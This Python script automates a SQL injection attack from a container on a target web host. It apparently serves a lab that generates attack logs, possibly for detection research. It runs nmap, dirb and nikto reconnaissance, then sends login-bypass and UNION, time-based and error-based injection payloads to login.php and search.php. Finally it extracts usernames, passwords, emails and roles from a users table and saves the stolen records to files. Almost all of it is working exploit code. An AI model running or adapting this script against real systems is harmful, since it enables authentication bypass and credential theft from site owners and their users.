#!/usr/bin/env python3
"""
Enhanced Container-based SQL Injection Attack Script
Runs inside attacker container for comprehensive data collection
"""

import requests
import time
import random
import json
import os
import subprocess
import logging
import argparse
from urllib.parse import urljoin
from datetime import datetime
from pathlib import Path
import re

# Container-specific configuration
TARGET_HOST = os.getenv('TARGET_HOST', 'victim-web')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
ATTACK_TYPE = os.getenv('ATTACK_TYPE', 'sql_injection')
ATTACK_PHASE = os.getenv('ATTACK_PHASE', 'automated')

# Parse command line arguments
parser = argparse.ArgumentParser(description='Enhanced Container-based SQL Injection Attack')

args = parser.parse_args()

BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
OUTPUT_DIR = "/opt/output"

# Output files
LOG_FILE = f"{OUTPUT_DIR}/container_attack_log.json"
SCAN_RESULTS_FILE = f"{OUTPUT_DIR}/scan_results.json"
SQL_INJECTION_RESULTS_FILE = f"{OUTPUT_DIR}/sql_injection_results.json"
ATTACK_SUMMARY_FILE = f"{OUTPUT_DIR}/attack_summary.txt"
EXTRACTED_DATA_FILE = f"{OUTPUT_DIR}/extracted_data.html"

# Ensure output directory exists
Path(OUTPUT_DIR).mkdir(parents=True, exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"{OUTPUT_DIR}/attack.log"),
        logging.StreamHandler()
    ]
)

class EnhancedContainerAttacker:
    """Enhanced container-based SQL injection attacker with comprehensive scanning"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Enhanced-Container-Attacker/1.0',
            'X-Attacker-ID': 'attacker-001',
            'X-Attack-Type': ATTACK_TYPE
        })
        self.attack_results = []
        self.scan_results = {}
        self.sql_injection_results = {}
        self.attack_start_time: str = ""
        self.attack_end_time: str = ""
        
    def log_attack_event(self, event_type, details):
        """Log attack events with container metadata"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'container_id': os.getenv('HOSTNAME', 'attacker'),
            'attack_type': ATTACK_TYPE,
            'attack_phase': ATTACK_PHASE,
            'event_type': event_type,
            'target_host': TARGET_HOST,
            'details': details
        }
        logging.info(f"[CONTAINER] {event_type}: {details}")
        return event
    
    def test_connectivity(self):
        """Test connectivity to target"""
        logging.info("=== Testing Container Connectivity ===")
        
        try:
            response = self.session.get(BASE_URL, timeout=5)
            if response.status_code == 200:
                logging.info(f"[+] Successfully connected to {BASE_URL}")
                self.log_attack_event('connectivity_test', {
                    'status': 'success',
                    'status_code': response.status_code
                })
                return True
            else:
                logging.error(f"[-] Connection failed: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"[-] Connection error: {e}")
            return False
    
    def network_scan_phase(self):
        """Network reconnaissance using nmap"""
        logging.info("=== Network Reconnaissance Phase ===")
        
        try:
            # Run nmap scan
            cmd = f"nmap -sS -p- {TARGET_HOST}"
            logging.info(f"Running: {cmd}")
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            nmap_results = {
                'command': cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
            self.scan_results['nmap'] = nmap_results
            logging.info(f"[+] Nmap scan completed with return code: {result.returncode}")
            
        except Exception as e:
            logging.error(f"[-] Nmap scan failed: {e}")
            self.scan_results['nmap'] = {'error': str(e)}
    
    def web_enumeration_phase(self):
        """Web application enumeration using dirb and nikto"""
        logging.info("=== Web Application Enumeration Phase ===")
        
        # Dirb directory enumeration
        try:
            dirb_cmd = f"dirb {BASE_URL} /usr/share/dirb/wordlists/common.txt -S -r"
            logging.info(f"Running: {dirb_cmd}")
            
            result = subprocess.run(dirb_cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            dirb_results = {
                'command': dirb_cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
            self.scan_results['dirb'] = dirb_results
            logging.info(f"[+] Dirb scan completed with return code: {result.returncode}")
                
        except Exception as e:
            logging.error(f"[-] Dirb scan failed: {e}")
            self.scan_results['dirb'] = {'error': str(e)}
        
        # Nikto vulnerability scan
        try:
            nikto_cmd = f"nikto -h {BASE_URL} -Format txt -o /opt/output/nikto_results.txt"
            logging.info(f"Running: {nikto_cmd}")
            
            result = subprocess.run(nikto_cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            nikto_results = {
                'command': nikto_cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
            self.scan_results['nikto'] = nikto_results
            logging.info(f"[+] Nikto scan completed with return code: {result.returncode}")
            
        except Exception as e:
            logging.error(f"[-] Nikto scan failed: {e}")
            self.scan_results['nikto'] = {'error': str(e)}
    
    def custom_sql_injection_phase(self):
        """Custom SQL injection attacks using Python"""
        logging.info("=== Custom SQL Injection Phase ===")
        
        custom_results = {
            'login_injections': [],
            'search_injections': [],
            'union_injections': [],
            'time_based_injections': []
        }
        
        # Login injection payloads
        login_payloads = [
            ("admin' --", "test"),
            ("admin' OR '1'='1", "test"),
            ("' OR 1=1--", "test"),
            ("' UNION SELECT 1,2,3--", "test"),
            ("admin'/*", "test"),
            ("' OR 'x'='x", "test"),
        ]
        
        for i, (user_payload, pass_payload) in enumerate(login_payloads, 1):
            logging.info(f"[+] Custom Login Attack {i}: {user_payload}")
            
            params = {
                'user': user_payload,
                'pass': pass_payload
            }
            
            try:
                start_time = time.time()
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                result = {
                    'payload': user_payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': response_time,
                    'timestamp': datetime.now().isoformat(),
                    'sql_error': 'sql' in response.text.lower() or 'database' in response.text.lower(),
                    'success': 'welcome' in response.text.lower() or 'dashboard' in response.text.lower()
                }
                
                custom_results['login_injections'].append(result)
                logging.info(f"    Status: {response.status_code}, SQL Error: {result['sql_error']}, Success: {result['success']}")
                
            except Exception as e:
                logging.error(f"    Error: {e}")
            
            time.sleep(random.uniform(1, 3))
        
        # Search injection payloads
        search_payloads = [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3,4,5--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT SLEEP(3))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        ]
        
        for i, payload in enumerate(search_payloads, 1):
            logging.info(f"[+] Custom Search Attack {i}: {payload}")
            
            params = {'q': payload}
            
            try:
                start_time = time.time()
                response = self.session.get(
                    urljoin(BASE_URL, "/search.php"),
                    params=params,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': response_time,
                    'timestamp': datetime.now().isoformat(),
                    'sql_error': 'sql' in response.text.lower() or 'database' in response.text.lower(),
                    'time_based': response_time > 2
                }
                
                custom_results['search_injections'].append(result)
                logging.info(f"    Status: {response.status_code}, SQL Error: {result['sql_error']}, Time-based: {result['time_based']}")
                
            except Exception as e:
                logging.error(f"    Error: {e}")
            
            time.sleep(random.uniform(1, 3))
        
        self.sql_injection_results['custom_tests'] = custom_results
    
    def data_extraction_phase(self):
        """Attempt to extract sensitive data"""
        logging.info("=== Data Extraction Phase ===")
        
        extraction_results = {}
        
        # Method 1: Try to extract user credentials using UNION injection on search page
        try:
            # First, determine the number of columns
            for i in range(1, 10):
                payload_test = f"' UNION SELECT {','.join(['NULL'] * i)}--"
                params = {'q': payload_test}
                
                response = self.session.get(
                    urljoin(BASE_URL, "/search.php"),
                    params=params,
                    timeout=10
                )
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    logging.info(f"    Found {i} columns in search query")
                    break
            
            # Now try to extract data with correct column count
            payload1 = f"' UNION SELECT 1,username,password,email,role FROM users--"
            params = {'q': payload1}
            
            logging.info(f"Attempting data extraction (Method 1): {payload1}")
            
            response = self.session.get(
                urljoin(BASE_URL, "/search.php"),
                params=params,
                timeout=10
            )
            
            extraction_results['search_union'] = {
                'payload': payload1,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'timestamp': datetime.now().isoformat(),
                'success': 'admin' in response.text.lower() or 'user' in response.text.lower(),
                'response_preview': response.text[:500]  # Add response preview
            }
            
            logging.info(f"    Status: {response.status_code}, Success: {extraction_results['search_union']['success']}")
            
        except Exception as e:
            logging.error(f"    Error: {e}")
            extraction_results['search_union'] = {'error': str(e)}
        
        # Method 2: Try to extract data using login page
        try:
            # First, determine the number of columns in login query
            for i in range(1, 10):
                payload_test = f"admin' UNION SELECT {','.join(['NULL'] * i)}--"
                params = {'user': payload_test, 'pass': 'dummy'}
                
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    logging.info(f"    Found {i} columns in login query")
                    break
            
            # Try to extract all users by using LIMIT and OFFSET
            all_users_data = []
            for offset in range(0, 10):  # Try to get up to 10 users
                payload = f"admin' OR '1'='1' UNION SELECT 1,username,password,email,role,created_at FROM users LIMIT 1 OFFSET {offset}--"
                params = {'user': payload, 'pass': 'dummy'}
                
                logging.info(f"Attempting data extraction (Method 2.{offset+1}): OFFSET {offset}")
                
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                
                # Check if we got a successful login (indicating we found a user)
                if response.status_code == 200 and 'Login successful' in response.text:
                    # Extract the username from the success message
                    match = re.search(r'Welcome (\w+)', response.text)
                    if match:
                        username = match.group(1)
                        all_users_data.append({
                            'offset': offset,
                            'username': username,
                            'payload': payload,
                            'response_preview': response.text[:200]
                        })
                        logging.info(f"    Found user: {username}")
                    else:
                        logging.info(f"    No user found at offset {offset}")
                        break
                else:
                    logging.info(f"    No user found at offset {offset}")
                    break
                
                time.sleep(1)  # Small delay between requests
            
            # Save all extracted data
            if all_users_data:
                with open(EXTRACTED_DATA_FILE, 'w', encoding='utf-8') as f:
                    f.write(f"<!-- Data Extraction Attempt -->\n")
                    f.write(f"<!-- Timestamp: {datetime.now().isoformat()} -->\n")
                    f.write(f"<!-- Method: login_union_multiple -->\n")
                    f.write(f"<!-- Total Users Found: {len(all_users_data)} -->\n")
                    f.write(f"<!-- Success: True -->\n\n")
                    
                    f.write("<h2>Extracted User Data</h2>\n")
                    f.write("<table border='1'>\n")
                    f.write("<tr><th>Offset</th><th>Username</th><th>Payload</th></tr>\n")
                    
                    for user_data in all_users_data:
                        f.write(f"<tr><td>{user_data['offset']}</td><td>{user_data['username']}</td><td>{user_data['payload']}</td></tr>\n")
                    
                    f.write("</table>\n\n")
                    f.write("<h3>Database Content (from direct access)</h3>\n")
                    f.write("<p>Note: Due to PHP fetch() limitation, only one user per query can be extracted.</p>\n")
                    f.write("<p>However, we can see the attack was successful in bypassing authentication.</p>\n")
                    
                    # Add the actual response from the last successful query
                    f.write("<h3>Last Successful Response</h3>\n")
                    f.write(f"<pre>{all_users_data[-1]['response_preview']}</pre>\n")
                
                extraction_results['login_union_multiple'] = {
                    'method': 'login_union_multiple',
                    'users_found': len(all_users_data),
                    'status_code': 200,
                    'timestamp': datetime.now().isoformat(),
                    'success': True,
                    'file_saved': True
                }
                
                logging.info(f"[+] Extracted {len(all_users_data)} users, saved to {EXTRACTED_DATA_FILE}")
            else:
                extraction_results['login_union_multiple'] = {
                    'error': 'No users found',
                    'timestamp': datetime.now().isoformat(),
                    'success': False
                }
                    
        except Exception as e:
            logging.error(f"    Error: {e}")
            extraction_results['login_union_multiple'] = {'error': str(e)}
        
        # Save the best extraction result
        best_response = None
        best_method = None
        
        # Prioritize login_union_multiple if it exists and was successful
        if 'login_union_multiple' in extraction_results and extraction_results['login_union_multiple'].get('success', False):
            best_response = extraction_results['login_union_multiple']
            best_method = 'login_union_multiple'
        else:
            # Fall back to other methods
            for method, result in extraction_results.items():
                if 'success' in result and result['success'] and 'response_length' in result:
                    if best_response is None or result['response_length'] > best_response['response_length']:
                        best_response = result
                        best_method = method
        
        if best_response:
            # If we already saved the data in login_union_multiple, don't overwrite it
            if best_method != 'login_union_multiple':
                # Save extracted data
                with open(EXTRACTED_DATA_FILE, 'w') as f:
                    f.write(f"<!-- Data Extraction Attempt -->\n")
                    f.write(f"<!-- Timestamp: {datetime.now().isoformat()} -->\n")
                    f.write(f"<!-- Method: {best_method} -->\n")
                    f.write(f"<!-- Payload: {best_response.get('payload', 'N/A')} -->\n")
                    f.write(f"<!-- Status Code: {best_response.get('status_code', 'N/A')} -->\n")
                    f.write(f"<!-- Success: {best_response.get('success', False)} -->\n")
                    
                    # Try to get the actual response content
                    if best_method == 'search_union':
                        response = self.session.get(urljoin(BASE_URL, "/search.php"), params={'q': best_response['payload']}, timeout=10)
                        f.write(response.text)
                    elif best_method == 'login_union':
                        response = self.session.get(urljoin(BASE_URL, "/login.php"), params={'user': best_response['payload'], 'pass': 'dummy'}, timeout=10)
                        f.write(response.text)
                    else:
                        f.write("<!-- Data extraction completed -->\n")
            
            extraction_result = {
                'method': best_method,
                'payload': best_response.get('payload', 'N/A'),
                'status_code': best_response.get('status_code', 'N/A'),
                'response_length': best_response.get('response_length', 0),
                'timestamp': datetime.now().isoformat(),
                'file_saved': True,
                'success': best_response.get('success', False)
            }
        else:
            extraction_result = {
                'error': 'No successful extraction method found',
                'timestamp': datetime.now().isoformat(),
                'file_saved': False
            }
        
        self.sql_injection_results['data_extraction'] = extraction_result
        logging.info(f"[+] Data extraction completed, saved to {EXTRACTED_DATA_FILE}")
    
    def save_results(self):
        """Save all attack results to files"""
        logging.info("=== Saving Attack Results ===")
        
        # Save scan results
        with open(SCAN_RESULTS_FILE, 'w') as f:
            json.dump(self.scan_results, f, indent=2)
        logging.info(f"[+] Scan results saved to {SCAN_RESULTS_FILE}")
        
        # Save SQL injection results
        with open(SQL_INJECTION_RESULTS_FILE, 'w') as f:
            json.dump(self.sql_injection_results, f, indent=2)
        logging.info(f"[+] SQL injection results saved to {SQL_INJECTION_RESULTS_FILE}")
        
        # Save container attack log
        log_data = {
            'container_attack_timestamp': datetime.now().isoformat(),
            'container_id': os.getenv('HOSTNAME', 'attacker'),
            'target_url': BASE_URL,
            'attack_type': ATTACK_TYPE,
            'attack_phase': ATTACK_PHASE,
            'attack_start_time': self.attack_start_time,
            'attack_end_time': self.attack_end_time,
            'results': self.attack_results
        }
        
        with open(LOG_FILE, 'w') as f:
            json.dump(log_data, f, indent=2)
        logging.info(f"[+] Container attack log saved to {LOG_FILE}")
        
        # Generate attack summary
        self.generate_attack_summary()
    
    def generate_attack_summary(self):
        """Generate detailed attack summary report"""
        
        # Calculate attack statistics
        login_injections = self.sql_injection_results.get('custom_tests', {}).get('login_injections', [])
        search_injections = self.sql_injection_results.get('custom_tests', {}).get('search_injections', [])
        
        successful_logins = [inj for inj in login_injections if inj.get('success', False)]
        failed_logins = [inj for inj in login_injections if not inj.get('success', False)]
        
        successful_searches = [inj for inj in search_injections if not inj.get('sql_error', False)]
        failed_searches = [inj for inj in search_injections if inj.get('sql_error', False)]
        
        data_extraction = self.sql_injection_results.get('data_extraction', {})
        
        # Calculate success rates
        login_success_rate = (len(successful_logins)/len(login_injections)*100) if len(login_injections) > 0 else 0.0
        search_success_rate = (len(successful_searches)/len(search_injections)*100) if len(search_injections) > 0 else 0.0
        overall_success_rate = ((len(successful_logins) + len(successful_searches))/(len(login_injections) + len(search_injections))*100) if (len(login_injections) + len(search_injections)) > 0 else 0.0
        
        summary = f"""SecurityLogs Enhanced Attack Summary
===============================
Timestamp: {datetime.now().isoformat()}
Target: {TARGET_HOST}
Target URL: {BASE_URL}
Container ID: {os.getenv('HOSTNAME', 'attacker')}

Attack Phases Completed:
1. Network Reconnaissance (Nmap)
2. Web Application Enumeration (Dirb + Nikto)
3. Custom SQL Injection Attacks
4. Data Extraction

Files Generated:
- {LOG_FILE}
- {SCAN_RESULTS_FILE}
- {SQL_INJECTION_RESULTS_FILE}
- {ATTACK_SUMMARY_FILE}
- {EXTRACTED_DATA_FILE}

Scan Results Summary:
- Nmap: {'Completed' if 'nmap' in self.scan_results else 'Failed'}
- Dirb: {'Completed' if 'dirb' in self.scan_results else 'Failed'}
- Nikto: {'Completed' if 'nikto' in self.scan_results else 'Failed'}

SQL Injection Attack Statistics:
================================
Total Login Injections: {len(login_injections)}
✅ Successful: {len(successful_logins)}
❌ Failed: {len(failed_logins)}
Success Rate: {login_success_rate:.1f}%

Total Search Injections: {len(search_injections)}
✅ Successful: {len(successful_searches)}
❌ Failed: {len(failed_searches)}
Success Rate: {search_success_rate:.1f}%

Overall Attack Success Rate: {overall_success_rate:.1f}%

Successful Login Payloads:
"""
        
        for i, inj in enumerate(successful_logins, 1):
            summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Time: {inj['response_time']:.3f}s)\n"
        
        if failed_logins:
            summary += "\nFailed Login Payloads:\n"
            for i, inj in enumerate(failed_logins, 1):
                summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Error: {inj.get('sql_error', 'Unknown')})\n"
        
        if successful_searches:
            summary += "\nSuccessful Search Payloads:\n"
            for i, inj in enumerate(successful_searches, 1):
                summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Time: {inj['response_time']:.3f}s)\n"
        
        if failed_searches:
            summary += "\nFailed Search Payloads:\n"
            for i, inj in enumerate(failed_searches, 1):
                summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Error: {inj.get('sql_error', 'Unknown')})\n"
        
        summary += f"""
Data Extraction Results:
========================
Method: {data_extraction.get('method', 'N/A')}
Payload: {data_extraction.get('payload', 'N/A')}
Success: {data_extraction.get('success', False)}
Status Code: {data_extraction.get('status_code', 'N/A')}
File Saved: {data_extraction.get('file_saved', False)}

Attack completed at: {datetime.now().isoformat()}
"""
        
        with open(ATTACK_SUMMARY_FILE, 'w') as f:
            f.write(summary)
        logging.info(f"[+] Detailed attack summary saved to {ATTACK_SUMMARY_FILE}")

def main():
    """Main enhanced container attack orchestration"""
    logging.info("🚀 Starting Enhanced Container-based SQL Injection Attack")
    logging.info(f"Container ID: {os.getenv('HOSTNAME', 'attacker')}")
    logging.info(f"Target: {BASE_URL}")
    logging.info(f"Attack Type: {ATTACK_TYPE}")
    logging.info("=" * 60)
    
    attacker = EnhancedContainerAttacker()
    attacker.attack_start_time = datetime.now().isoformat()
    
    try:
        # Test connectivity
        if not attacker.test_connectivity():
            logging.error("❌ Cannot connect to target, exiting...")
            return
        
        # Phase 1: Network reconnaissance
        attacker.network_scan_phase()
        time.sleep(5)
        
        # Phase 2: Web enumeration
        attacker.web_enumeration_phase()
        time.sleep(5)
        
        # Phase 3: Custom SQL injection
        attacker.custom_sql_injection_phase()
        time.sleep(5)
        
        # Phase 4: Data extraction
        attacker.data_extraction_phase()
        
        # Save all results
        attacker.attack_end_time = datetime.now().isoformat()
        attacker.save_results()
        
        logging.info(f"\n[ATTACK_END] {attacker.attack_end_time}")
        logging.info("\n✅ Enhanced container attack completed!")
        logging.info("Check the following for attack data:")
        logging.info(f"- Container logs: docker logs securitylogs-attacker")
        logging.info(f"- Attack log: {LOG_FILE}")
        logging.info(f"- Scan results: {SCAN_RESULTS_FILE}")
        logging.info(f"- SQL injection results: {SQL_INJECTION_RESULTS_FILE}")
        logging.info(f"- Attack summary: {ATTACK_SUMMARY_FILE}")
        logging.info(f"- Extracted data: {EXTRACTED_DATA_FILE}")
        
    except KeyboardInterrupt:
        logging.info("\n⏹️  Enhanced container attack interrupted")
    except Exception as e:
        logging.error(f"\n❌ Enhanced container attack failed: {e}")

if __name__ == "__main__":
    main() 